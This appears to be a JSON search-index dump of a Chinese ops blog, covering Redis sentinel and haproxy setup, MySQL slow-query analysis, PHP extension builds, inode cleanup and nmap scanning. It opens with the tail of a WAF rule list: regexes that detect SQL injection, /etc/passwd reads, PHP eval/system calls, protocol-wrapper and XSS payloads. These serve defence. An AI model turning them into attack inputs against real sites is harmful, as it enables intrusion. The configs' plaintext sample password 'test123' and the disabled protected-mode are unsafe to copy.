12345678910111213141516171819202122\\.\\./\\:\\$\\$\\&#123;select.+(from|limit)(?:(union(.*?)select))having|rongjitestsleep\\((\\s*)(\\d*)(\\s*)\\)benchmark\\((.*)\\,(.*)\\)base64_decode\\((?:from\\W+information_schema\\W)(?:(?:current_)user|database|schema|connection_id)\\s*\\((?:etc\\/\\W*passwd)into(\\s+)+(?:dump|out)file\\s*group\\s+by.+\\(xwork.MethodAccessor(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\(xwork\\.MethodAccessor(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/java\\.lang\\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\\[\\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)(onmouseover|onerror|onload)\\=","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"OpenResty","slug":"OpenResty","permalink":"https://garywu520.github.io/tags/OpenResty/"},{"name":"Lua","slug":"Lua","permalink":"https://garywu520.github.io/tags/Lua/"},{"name":"WAF","slug":"WAF","permalink":"https://garywu520.github.io/tags/WAF/"},{"name":"防火墙","slug":"防火墙","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"应用防火墙","slug":"应用防火墙","permalink":"https://garywu520.github.io/tags/%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Iptables","slug":"Iptables","permalink":"https://garywu520.github.io/tags/Iptables/"}]},{"title":"清理linux系统过多innode","slug":"清理linux系统过多innode","date":"2019-10-12T02:41:32.000Z","updated":"2019-10-12T02:53:24.423Z","comments":true,"path":"2019/10/12/清理linux系统过多innode/","link":"","permalink":"https://garywu520.github.io/2019/10/12/%E6%B8%85%E7%90%86linux%E7%B3%BB%E7%BB%9F%E8%BF%87%E5%A4%9Ainnode/","excerpt":"zabbix告警提示系统：Free innodes is less than 20% on volume / 1.查看剩余innode信息 1df -ih","text":"zabbix告警提示系统：Free innodes is less than 20% on volume / 1.查看剩余innode信息 1df -ih 2.找到这些占用较大innode的无用文件 12#从根开始遍历根目录 for i in /*; do echo $i; find $i |wc -l; done 12#我这里找到了/var目录innodes占用较大，继续遍历 for i in /var/*; do echo $i; find $i |wc -l; done 12# 这里显示/var/spool目录，继续找 for i in /var/spool/*; do echo $i; find $i |wc -l; done 以此类推，最终找到了占用较大innode的目录是/var/spool/postfix/maildrop 3.原因 是因为maildrop目录下堆积了太多文件导致的。linux在执行cron时，会将cron执行脚本中的output和warning信息，都会以邮件的形式发送Cron所有者， 而由于环境中的sendmail和postfix没有正常运行，导致邮件发送不成功，全部小文件堆积在了maildrop目录下面，而且没有自动清理转换的机制，所以时间一长，此目录就堆积了大量文件。 4.清理maildrop目录文件 1cd /var/spool/postfix/maildrop; ls | xargs rm -rf 5.预防后患 12vi /etc/crontab将‘MAILTO=root’替换成‘MAILTO=&quot;&quot;，然后service crond restart即可。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"innode","slug":"innode","permalink":"https://garywu520.github.io/tags/innode/"},{"name":"spool","slug":"spool","permalink":"https://garywu520.github.io/tags/spool/"},{"name":"maildrop","slug":"maildrop","permalink":"https://garywu520.github.io/tags/maildrop/"}]},{"title":"MySQL慢查询记录与分析","slug":"MySQL慢查询记录与分析","date":"2019-10-11T08:13:48.000Z","updated":"2019-10-11T10:43:02.545Z","comments":true,"path":"2019/10/11/MySQL慢查询记录与分析/","link":"","permalink":"https://garywu520.github.io/2019/10/11/MySQL%E6%85%A2%E6%9F%A5%E8%AF%A2%E8%AE%B0%E5%BD%95%E4%B8%8E%E5%88%86%E6%9E%90/","excerpt":"一、查看慢查询-配置12mysql&gt; show variables like &#39;slow_query%&#39;;mysql&gt; show variables like &#39;long_query_time&#39;;","text":"一、查看慢查询-配置12mysql&gt; show variables like &#39;slow_query%&#39;;mysql&gt; show variables like &#39;long_query_time&#39;; 二、配置慢查询12345678#将 slow_query_log 全局变量设置为“ON”状态mysql&gt; set global slow_query_log&#x3D;&#39;ON&#39;; #设置慢查询日志存放的位置mysql&gt; set global slow_query_log_file&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;slow.log&#39;;#查询超过1秒就记录mysql&gt; set global long_query_time&#x3D;1; 配置文件配置 cat /etc/my.cnf 1234[mysqld]slow_query_log = ONslow_query_log_file = /usr/local/mysql/data/slow.loglong_query_time = 1 三、慢查询分析工具/报告1. Python脚本(不太好使，有报错)项目Fork版地址：https://github.com/garywu520/Mysql-SlowLog-analysis 12#安装依赖easy_install Jinja2 或 pip install Jinja2 123wget https://raw.githubusercontent.com/kalivim/Mysql-SlowLog-analysis/master/analysis-slow-log.pychmod +x analysis-slow-log.py./analysis-slow-log.py Mysql_SlowLog_file general_json_filename report_name 参数说明： Mysql_SlowLog_file mysql慢查询日志的文件名 general_json_filename 脚本生成的json报告文件名 report_name 生成的Html报告文件名 2. pt-query-digest原生log分析编译安装percona-toolkit 12#安装依赖yum install *MakeMaker* mysql-libs perl-TermReadKey perl-DBD-MySQL 下载编译安装 Percona Toolkit 3.1.0: 官网下载地址 1234567tar -zxvf percona-toolkit-3.1.0_x86_64.tar.gz#编译安装cd percona-toolkit-3.1.0perl Makefile.PLmake &amp;&amp; make testmake install 1ls -lh /usr/local/bin/pt-query-digest pt-query-digest使用 这里我们用到了这个文件 /usr/local/bin/pt-query-digest 12#生成json报告pt-query-digest --progress time,1 --output json mysql-slow.log 参数释义： ​ – progress time,1 显示慢查询分析进度，没1s刷新一次 ​ –output 分析结果输出类型, json, report , json-anon","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"pt-query-digest","slug":"pt-query-digest","permalink":"https://garywu520.github.io/tags/pt-query-digest/"},{"name":"慢查询","slug":"慢查询","permalink":"https://garywu520.github.io/tags/%E6%85%A2%E6%9F%A5%E8%AF%A2/"},{"name":"分析","slug":"分析","permalink":"https://garywu520.github.io/tags/%E5%88%86%E6%9E%90/"}]},{"title":"CentOS7 PHP安装mcrypt扩展","slug":"CentOS7-PHP安装mcrypt扩展","date":"2019-09-29T05:38:32.000Z","updated":"2019-09-29T05:43:25.343Z","comments":true,"path":"2019/09/29/CentOS7-PHP安装mcrypt扩展/","link":"","permalink":"https://garywu520.github.io/2019/09/29/CentOS7-PHP%E5%AE%89%E8%A3%85mcrypt%E6%89%A9%E5%B1%95/","excerpt":"1. 下载对应PHP版本解压 官网: http://www.php.net/releases/ 这里是php 5.4.16, 在官网搜索这个版本下载 123wget http://museum.php.net/php5/php-5.4.16.tar.gztar -zxvf php-5.4.16.tar.gzcd php-5.4.16/ext/mcrypt/","text":"1. 下载对应PHP版本解压 官网: http://www.php.net/releases/ 这里是php 5.4.16, 在官网搜索这个版本下载 123wget http://museum.php.net/php5/php-5.4.16.tar.gztar -zxvf php-5.4.16.tar.gzcd php-5.4.16/ext/mcrypt/ 12345[root@globtc-online mcrypt]# phpizeConfiguring for:PHP Api Version: 20100412Zend Module Api No: 20100525Zend Extension Api No: 220100525 123whereis php-config./configure --with-php-config=/usr/bin/php-configmake &amp;&amp; make install 12#出现如下内容，说明安装成功Installing shared extensions: /usr/lib64/php/modules/ 2. 检查并配置扩展1ls -lh /usr/lib64/php/modules/mcrypt.so 12#/etc/php.ini 添加如下行：extension=/usr/lib64/php/modules/mcrypt.so 12systemctl restart php-fpmsystemctl restart httpd","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"PHP","slug":"PHP","permalink":"https://garywu520.github.io/tags/PHP/"},{"name":"mcrypt","slug":"mcrypt","permalink":"https://garywu520.github.io/tags/mcrypt/"},{"name":"extension","slug":"extension","permalink":"https://garywu520.github.io/tags/extension/"}]},{"title":"Redis RDB数据备份恢复流程","slug":"Redis-RDB数据备份恢复流程","date":"2019-09-25T11:04:06.000Z","updated":"2019-09-25T11:06:20.930Z","comments":true,"path":"2019/09/25/Redis-RDB数据备份恢复流程/","link":"","permalink":"https://garywu520.github.io/2019/09/25/Redis-RDB%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D%E6%B5%81%E7%A8%8B/","excerpt":"环境 appendonly为no，仅有RDB持久化 架构：Redis 一主两从+sentinel哨兵 Redis使用supervisor管理","text":"环境 appendonly为no，仅有RDB持久化 架构：Redis 一主两从+sentinel哨兵 Redis使用supervisor管理 正确的数据备份与恢复流程1. 备份 找到当前的Master节点，执行SAVE命令将最新的key写入磁盘 拷贝备份文件[/usr/local/redis/data/dump.rdb]到/root/目录下 2. 恢复 supervisorctl stop所有节点的sentinel服务 supervisorctl stop 两个slave服务 redis主节点的supervisor redis配置文件 临时 注释以下两行 12#autostart=true#autorestart=true 优雅关闭Master 12redis-cli -c -h 192.168.1.168 -p 6380 -a &quot;test123&quot;redis&gt; SHUTDOWN 数据拷贝 1cp /root/dump.rdb /usr/local/redis/data/ 启动Master节点 12345supervisorctl start redis#验证导入的数据redis-cli -c -h 192.168.1.168 -p 6380 -a &quot;test123&quot;redis&gt; dbsize redis主节点取消supervisor redis配置文件的注释, 并重启master 12autostart=trueautorestart=true supervisorctl restart redis 启动两个Slave 12345supervisorctl start redis#验证Slave从库同步登录redis slave redis&gt; dbsize 启动三个节点的sentinel 1supervisorctl start redis-sentinel","categories":[],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://garywu520.github.io/tags/Redis/"},{"name":"RDB","slug":"RDB","permalink":"https://garywu520.github.io/tags/RDB/"},{"name":"rdb备份恢复","slug":"rdb备份恢复","permalink":"https://garywu520.github.io/tags/rdb%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/"}]},{"title":"shell脚本执行redis命令","slug":"shell脚本执行redis命令","date":"2019-09-25T09:34:03.000Z","updated":"2019-09-25T09:44:16.704Z","comments":true,"path":"2019/09/25/shell脚本执行redis命令/","link":"","permalink":"https://garywu520.github.io/2019/09/25/shell%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8Credis%E5%91%BD%E4%BB%A4/","excerpt":"","text":"shell脚本中执行redis命令 1redis-cli -h 192.168.1.186 -p 6380 -a test123 info 或 1echo &quot;get old1&quot; | redis-cli -h 192.168.1.186 -p 6380 -a test123 参数释义： -a 指定redis密码 最后的”info” 则是想要执行的redis命令","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"}]},{"title":"CentOS7安装php redis扩展","slug":"CentOS7安装php-redis扩展","date":"2019-09-25T07:00:56.000Z","updated":"2019-09-25T07:13:59.627Z","comments":true,"path":"2019/09/25/CentOS7安装php-redis扩展/","link":"","permalink":"https://garywu520.github.io/2019/09/25/CentOS7%E5%AE%89%E8%A3%85php-redis%E6%89%A9%E5%B1%95/","excerpt":"一、编译扩展安装phpize 1yum install -y php-devel 下载php redis包 Github项目地址：https://github.com/phpredis/phpredis/releases 12345678wget https://github.com/phpredis/phpredis/archive/3.1.3.tar.gztar -zxvf /root/3.1.3.tar.gzcd phpredis-3.1.3#使用如下命令，在源码目录中编译php扩展/usr/bin/phpize./configuremake &amp;&amp; make install","text":"一、编译扩展安装phpize 1yum install -y php-devel 下载php redis包 Github项目地址：https://github.com/phpredis/phpredis/releases 12345678wget https://github.com/phpredis/phpredis/archive/3.1.3.tar.gztar -zxvf /root/3.1.3.tar.gzcd phpredis-3.1.3#使用如下命令，在源码目录中编译php扩展/usr/bin/phpize./configuremake &amp;&amp; make install 由于我的操作系统是x64位，故编译完成后提示如下： 1234Build complete.Don&#x27;t forget to run &#x27;make test&#x27;.Installing shared extensions: /usr/lib64/php/modules/ PHP Redis扩展位置 1ls -lh /usr/lib64/php/modules/redis.so 二、修改php配置12vim /etc/php.ini #添加如下行extension=/usr/lib64/php/modules/redis.so 三、重启Apache服务, 并测试1systemctl restart httpd","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"php","slug":"php","permalink":"https://garywu520.github.io/tags/php/"}]},{"title":"nmap端口扫描","slug":"nmap端口扫描","date":"2019-09-20T10:25:01.000Z","updated":"2019-09-20T10:25:58.246Z","comments":true,"path":"2019/09/20/nmap端口扫描/","link":"","permalink":"https://garywu520.github.io/2019/09/20/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/","excerpt":"1.应用场景如果有台服务器，开放了一些端口，尤其是SSH端口，忘记设置了多少端口号的时候，又不想重启服务器，则需要对其进行端口扫描 2. 工具: nmap1yum install -y nmap","text":"1.应用场景如果有台服务器，开放了一些端口，尤其是SSH端口，忘记设置了多少端口号的时候，又不想重启服务器，则需要对其进行端口扫描 2. 工具: nmap1yum install -y nmap 3. 用法1nmap -sS -p 1-65535 -v 服务器公网IP 参数： -sS TCP SYN扫描 -P 指定端口范围 -V 详细信息","categories":[],"tags":[{"name":"nmap","slug":"nmap","permalink":"https://garywu520.github.io/tags/nmap/"}]},{"title":"Redis主从+sentinel哨兵-理论","slug":"Redis主从-sentinel哨兵-理论","date":"2019-09-19T08:14:04.000Z","updated":"2019-09-19T09:44:00.383Z","comments":true,"path":"2019/09/19/Redis主从-sentinel哨兵-理论/","link":"","permalink":"https://garywu520.github.io/2019/09/19/Redis%E4%B8%BB%E4%BB%8E-sentinel%E5%93%A8%E5%85%B5-%E7%90%86%E8%AE%BA/","excerpt":"一、目录 Redis内存回收策略 主从+哨兵模式核心知识点 注：Redis主从+sentinel哨兵集群部署：参考","text":"一、目录 Redis内存回收策略 主从+哨兵模式核心知识点 注：Redis主从+sentinel哨兵集群部署：参考 二、关于Redis内存回收策略Redis会因为内存不足而产生错误，也会因为回收过久而导致系统长期处于卡顿状态。当Redis的内存达到规定的最大值时，可以进行配置淘汰key, 并对key进行回收。 redis八大回收机制： noeviction[默认策略] 不淘汰任何键值对, 当内存满时，读操作(例如:get命令) 它将政策工作，而做写操作，它将返回错误。所以，当内存满时，redis就不能写了 volatile-lru: 采用最近最少的淘汰策略, Redis将回收那些超时的(仅仅是超时的)键值对。 allkeys-lru: 采用最近最少的淘汰策略，Redis将对所有的(不仅仅是超时的)键值对采用最近最少使用的淘汰策略 volatile-lfu: 采用最近最不常用的淘汰策略，也就是在一定时间内，被访问次数最少的(已超时)键值对将被回收。 allkeys-lfu: 采用最近最不常用的淘汰策略，Redis将对所有的键值对采用最近最不常用的淘汰策略。 volatile-random：采用随机淘汰策略删除超时的键值对。 allkeys-random：采用随机淘汰策略删除所有的键值对，这个策略不常用。 volatile-ttl：采用删除存活时间最短的键值对策略。 注：LRU算法或者TTL算法都是不精确的算法，而是一个近似算法。 动态设置回收策略 123redis&gt; config set maxmemory 768mb #最大限制内存redis&gt; config set maxmemory-policy volatile-lru #内存回收策略redis&gt; config rewrite #配置写入配置文件 三、主从+哨兵模式核心知识点1. 关于哨兵的介绍sentinel, 中文：哨兵，哨兵是redis重要的一个组件，具有以下功能 集群监控: 负责监控redis master和slave进程是否正常工作 消息通知: 如果某个redis实例有故障,那么哨兵负责发送消息作为报警通知给管理员 故障转移：如果master node挂掉了，master功能会自动转移到slave node上 配置中心：如果故障转移发生了，通知client客户端新的master地址 哨兵用于实现redis集群高可用，本身也是分布式的，作为一个哨兵集群去运行，互相协同工作。 故障转移时，判断一个master node是否宕机了，需要大部分的哨兵同意才行，涉及到了分布式选举的问题。 即使部分哨兵节点挂掉了，哨兵集群还是可以正常工作的。 2. 哨兵的核心知识 哨兵至少需要3个实例来保证自己的健壮性。 哨兵+redis主从的部署架构，是不保证数据零丢失的，只能保证redis集群的高可用性 哨兵sentinel主备切换导致的数据丢失问题 3. 两种情况导致的数据丢失： 异步复制过程中导致的数据丢失 因为master –&gt; slave的同步是异步的，所以有可能有部分数据还没复制到slave，master就down机了，此时这部分数据就丢失了。 脑裂导致的数据丢失 脑裂，也就是说某个master所在的机器突然脱离了网络，跟其他slave不能正常通信，但是实际上Master还运行着。此时哨兵会认为master已经宕机了，然后开始重新选举，将其他slave切换成了master。这个时候集群里出现了2个master。 如果某个slave被哨兵选举切换成了master，但是可能client还没来得及切换到新master，还会继续向旧master写数据。因此，旧master再次恢复的时候，会被作为一个slave挂到新的master上去，而自己的数据会被清空，重新从新的master复制数据。而新的master并没有后来client写入的数据，因此，这部分数据就丢失了 数据丢失问题解决方案： 12345#control data lossmin-slaves-to-write 1min-slaves-max-lag 10#表示：至少有1个slave的数据复制和同步延迟不能超过10秒；如果所有的slave数据复制和延迟都超过了10秒，那么这个时候，master就不会再接受任何请求了。 减少异步复制数据丢失 min-slaves-max-lag这个参数，一旦slave复制数据和ack延时太长，就认为可能master宕机后损失的数据太多了，那么就拒绝写请求。从而把数据丢失降低到可控范围 减少脑裂的数据丢失 如果一个master出现了脑裂，跟其他slave断开了连接，如果不能给指定数量的slave发送数据，那么如果slave超过10秒没有给自己发送ack消息，则直接拒绝客户端的写请求。因此在脑裂环境下，最多就丢失10秒的数据。 3. 关于sdown和odown转换机制哨兵如何去判断master是否宕机？ sdown是主观宕机，就一个哨兵如果自己觉得master宕机了，那么就是主观宕机 odown是客观宕机，如果quorum数量的哨兵都认为一个master宕机了，那么就是客观宕机。 sdown达成条件很简单，如果一个哨兵ping一个master, 超过了is-master-down-after-milliseconds指定的毫秒数之后，就主观认为master宕机了； 如果一个哨兵在指定的时间内，收到了quorum数量的其他哨兵也认为那个master是sdown的状态，那么就认为是odown 4. 哨兵集群的自动发现机制哨兵互相之间的发现，是通过 redis 的 pub/sub 系统实现的，每个哨兵都会往 __sentinel__:hello 这个 channel 里发送一个消息，这时候所有其他哨兵都可以消费到这个消息，并感知到其他的哨兵的存在。 每隔两秒钟，每个哨兵都会往自己监控的某个 master+slaves 对应的 __sentinel__:hello channel 里发送一个消息，内容是自己的 host、ip 和 runid 还有对这个 master 的监控配置。 每个哨兵也会去监听自己监控的每个 master+slaves 对应的 __sentinel__:hello channel，然后去感知到同样在监听这个 master+slaves 的其他哨兵的存在。 每个哨兵还会跟其他哨兵交换对 master 的监控配置，互相进行监控配置的同步。 5. Slave配置的自动纠正哨兵会负责自动纠正 slave 的一些配置，比如 slave 如果要成为潜在的 master 候选人，哨兵会确保 slave 复制现有 master 的数据；如果 slave 连接到了一个错误的 master 上，比如故障转移之后，那么哨兵会确保它们连接到正确的 master 上。 6. Slave —&gt; Master选举算法如果一个 master 被认为 odown 了，而且 majority 数量的哨兵都允许主备切换，那么某个哨兵就会执行主备切换操作，此时首先要选举一个 slave 来，会考虑 slave 的一些信息： 跟 master 断开连接的时长 slave 优先级 复制 offset run id 如果一个 slave 跟 master 断开连接的时间已经超过了 down-after-milliseconds 的 10 倍，外加 master 宕机的时长，那么 slave 就被认为不适合选举为 master。 1(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state 接下来会对 slave 进行排序： 按照 slave 优先级进行排序，slave priority 越低，优先级就越高。 如果 slave priority 相同，那么看 replica offset，哪个 slave 复制了越多的数据，offset 越靠后，优先级就越高。 如果上面两个条件都相同，那么选择一个 run id 比较小的那个 slave。 7. quorum和majority每次一个哨兵要做主备切换，首先需要 quorum 数量的哨兵认为 odown，然后选举出一个哨兵来做切换，这个哨兵还需要得到 majority 哨兵的授权，才能正式执行切换。 如果 quorum &lt; majority，比如 5 个哨兵，majority 就是 3，quorum 设置为 2，那么就 3 个哨兵授权就可以执行切换。 但是如果 quorum &gt;= majority，那么必须 quorum 数量的哨兵都授权，比如 5 个哨兵，quorum 是 5，那么必须 5 个哨兵都同意授权，才能执行切换。 8. configuration epoch哨兵会对一套 redis master+slaves 进行监控，有相应的监控的配置。 执行切换的那个哨兵，会从要切换到的新 master（salve-&gt;master）那里得到一个 configuration epoch，这就是一个 version 号，每次切换的 version 号都必须是唯一的。 如果第一个选举出的哨兵切换失败了，那么其他哨兵，会等待 failover-timeout 时间，然后接替继续执行切换，此时会重新获取一个新的 configuration epoch，作为新的 version 号。 9. configuration传播哨兵完成切换之后，会在自己本地更新生成最新的 master 配置，然后同步给其他的哨兵，就是通过之前说的 pub/sub 消息机制。 这里之前的 version 号就很重要了，因为各种消息都是通过一个 channel 去发布和监听的，所以一个哨兵完成一次新的切换之后，新的 master 配置是跟着新的 version 号的。其他的哨兵都是根据版本号的大小来更新自己的 master 配置的。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"sentinel","slug":"sentinel","permalink":"https://garywu520.github.io/tags/sentinel/"}]},{"title":"Redis主从+sentinel哨兵高可用","slug":"Redis主从-sentinel哨兵高可用","date":"2019-09-19T07:50:02.000Z","updated":"2019-09-25T11:02:44.431Z","comments":true,"path":"2019/09/19/Redis主从-sentinel哨兵高可用/","link":"","permalink":"https://garywu520.github.io/2019/09/19/Redis%E4%B8%BB%E4%BB%8E-sentinel%E5%93%A8%E5%85%B5%E9%AB%98%E5%8F%AF%E7%94%A8/","excerpt":"一、环境 基本环境 软件 版本 Redis 5.0.5 OS CentOS7","text":"一、环境 基本环境 软件 版本 Redis 5.0.5 OS CentOS7 集群环境 角色 IP 端口 Master主节点1 192.168.1.186 6380 sentinel-哨兵1 192.168.1.186 16380 Slave从节点2 192.168.1.168 6380 sentinel-哨兵2 192.168.1.168 16380 Slave从节点3 192.168.1.102 6380 sentinel-哨兵3 192.168.1.102 16380 HA 192.168.1.186 26380 注：为了哨兵集群的健壮性，哨兵的节点数量建议是≥3的奇数。 ​ 哨兵 + redis 主从的部署架构，是不保证数据零丢失的，只能保证 redis 集群的高可用性。 ​ 二、安装Redis123456yum install -y gcc g++ gcc-c++ make tclwget http://download.redis.io/releases/redis-5.0.5.tar.gztar -zxvf redis-5.0.5.tar.gzcd redis-5.0.5makemake PREFIX=/usr/local/redis install 12345mkdir -p /usr/local/redis/etccp /root/redis-5.0.5/redis.conf /usr/local/redis/etc/cp /root/redis-5.0.5/sentinel.conf /usr/local/redis/etc/mkdir -p /var/log/redis #创建日志目录mkdir -p /usr/local/redis/data #创建数据存放目录 三、配置Redis主从复制全节点优化 123456echo 2048 &gt; /proc/sys/net/core/somaxconn#在/etc/sysctl.conf中添加如下net.core.somaxconn = 2048vm.overcommit_memory = 1sysctl -p 12echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledecho &quot;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&quot; &gt;&gt;/etc/rc.d/rc.local 1.Master主节点1 + 哨兵配置主redis - cat /usr/local/redis/etc/redis.conf 12345678910111213141516171819202122232425262728port 6380daemonize noprotected-mode nopidfile /var/run/redis_6380.pidtcp-backlog 511bind 192.168.1.186 127.0.0.1timeout 0tcp-keepalive 300loglevel noticelogfile &quot;/var/log/redis/redis_6380.log&quot;save 900 1save 300 10save 60 10000appendonly no dir /usr/local/redis/datadbfilename dump.rdbmaxclients 10000maxmemory 4gbrequirepass test123#------优化------------##内存回收策略maxmemory-policy volatile-lru#control data lossmin-slaves-to-write 1min-slaves-max-lag 10#慢查询优化slowlog-log-slower-than 10000slowlog-max-len 128 redis supervisor 1234567891011cat /etc/supervisord.d/redis.conf [program:redis]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.confstdout_logfile=/var/log/redis/redis_6380.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 配置sentinel集群 - cat /usr/local/redis/etc/sentinel.conf 123456789101112131415161718192021bind 192.168.1.186protected-mode nodaemonize noport 16380logfile &quot;/var/log/redis/redis-sentinel.log&quot;dir /usr/local/redis/data#表示配置sentinel去监视名为redis_master的主服务器，IP为192.168.1.198，端口是6379；最后一个数字表示只要有2个sentinel同意[共3个sentinel]就可以启动自动故障迁移。sentinel monitor redis_master 192.168.1.186 6380 2#表示如果10s内redis_master没PING响应或者返回一个错误，sentinel就把服务器标记为主观下线[简称: SDOWN]sentinel down-after-milliseconds redis_master 10000#在执行故障转移时， 最多可以有多少个从slave服务器同时对新的主服务器进行同步， 这个数字越小， 完成故障转移所需的时间就越长。sentinel parallel-syncs redis_master 1 #sentinel哨兵连接主节点密码[需要与master密码一致]sentinel auth-pass redis_master test123##表示如果15秒后,mysater仍没活过来，则启动failover，从剩下的slave中选一个升级为mastersentinel failover-timeout redis_master 15000 redis-sentinel supervisor 12345678910[program:redis-sentinel]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.confstdout_logfile=/var/log/redis/redis-sentinel.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 2.部署Redis从节点2 + 哨兵配置从redis - cat /usr/local/redis/etc/redis.conf 1234567891011121314151617181920212223242526272829303132333435port 6380daemonize noprotected-mode nopidfile /var/run/redis_6380.pidtcp-backlog 511bind 192.168.1.168 127.0.0.1timeout 0tcp-keepalive 300loglevel noticelogfile &quot;/var/log/redis/redis_6380.log&quot;save 900 1save 300 10save 60 10000appendonly no slaveof 192.168.1.186 6380dir /usr/local/redis/datadbfilename dump.rdbmaxclients 10000maxmemory 4gb#从库添加master密码masterauth test123 #从库自身认证密码[主从切换之后，依然使用密码认证]requirepass test123#------优化------------##内存回收策略maxmemory-policy volatile-lru#control data lossmin-slaves-to-write 1min-slaves-max-lag 10#慢查询优化slowlog-log-slower-than 10000slowlog-max-len 128 supervisor 12345678910[program:redis]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.confstdout_logfile=/var/log/redis/redis_6379.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 配置sentinel集群 - cat /usr/local/redis/etc/sentinel.conf 只需修改Bind地址 123456789101112bind 192.168.1.168protected-mode nodaemonize noport 16380logfile &quot;/var/log/redis/redis-sentinel.log&quot;dir /usr/local/redis/datasentinel monitor redis_master 192.168.1.186 6380 2sentinel down-after-milliseconds redis_master 10000sentinel parallel-syncs redis_master 1 sentinel auth-pass redis_master test123sentinel failover-timeout redis_master 15000 redis-sentinel supervisor 12345678910[program:redis-sentinel]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.confstdout_logfile=/var/log/redis/redis-sentinel.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 3.部署Redis从节点2 + 哨兵参考步骤2，注意修改bind地址 四、验证1. 主从验证123456redis&gt; info Replication #查看主节点状态# Replicationrole:masterconnected_slaves:2slave0:ip=192.168.1.168,port=6380,state=online,offset=22520,lag=1slave1:ip=192.168.1.102,port=6380,state=online,offset=22520,lag=1 123456redis&gt; info Replication #查看从节点状态# Replicationrole:slavemaster_host:192.168.1.186master_port:6379master_link_status:up 2. 哨兵 高可用验证 stop 主节点，观察sentinel哨兵日志 可以看到主从已经发生了转变 通过配置文件可以看到，原来的主节点，配置同步成了从节点 注：redis共3个节点情况下，如果master宕机后，架构将会变化为：一个master和一个slave 3. 主库与从库key过期同步–测试123456789101112131415#主库创建测试key，并设置生效时间。当过期后，立即在从库get key测试192.168.1.198:6379&gt; set old 30OK192.168.1.198:6379&gt; get old&quot;30&quot;#设置key 60秒过期192.168.1.198:6379&gt; EXPIRE old &quot;60&quot; (integer) 1192.168.1.198:6379&gt; ttl old(integer) 56#此时，key已过期192.168.1.198:6379&gt; ttl old(integer) -2 12345#从库获取key情况192.168.1.121:6379&gt; get old(nil)#可以看到主库删除key，从库立即同步key, 不存在从库仍然可以读到过期key的情况 五、HA-Haproxy使用虚VIP，代理后端的Redis主从。并且通过TCP监控redis master，这样就能保证数据一定会写到redis master了，即便是后端主从发生了变化亦是如此 123456yum groupinstall -y &quot;Development tools&quot;wget https://www.haproxy.org/download/1.7/src/haproxy-1.7.7.tar.gztar -zxvf haproxy-1.7.7.tar.gzcd haproxy-1.7.7make TARGET=linux2628 ARCH=X86_64 PREFIX=/usr/local/haproxymake install PREFIX=/usr/local/haproxy 12useradd -s /sbin/nologin -M haproxymkdir /etc/haproxy -p vim /etc/haproxy/haproxy.cfg 1234567891011121314151617181920212223242526272829303132333435global chroot /usr/local/haproxy log 127.0.0.1 local3 info maxconn 100000 nbproc 1 user haproxy group haproxy tune.bufsize 32768 pidfile /usr/local/haproxy/haproxy.pid defaults mode tcp retries 3 timeout connect 10s timeout client 20s timeout server 30s timeout check 10s listen redis bind 0.0.0.0:26380 mode tcp log global balance roundrobin option tcp-check tcp-check send AUTH\\ test123\\r\\n #指定Redis认证密码 tcp-check expect string +OK tcp-check send PING\\r\\n tcp-check expect string +PONG tcp-check send info\\ replication\\r\\n tcp-check expect string role:master tcp-check send QUIT\\r\\n tcp-check expect string +OK server R1 192.168.1.186:6380 check inter 5s server R2 192.168.1.168:6380 check inter 5s server R3 192.168.1.102:6380 check inter 5s 启动测试 1/usr/local/haproxy/sbin/haproxy -f /etc/haproxy/haproxy.cfg supervisor 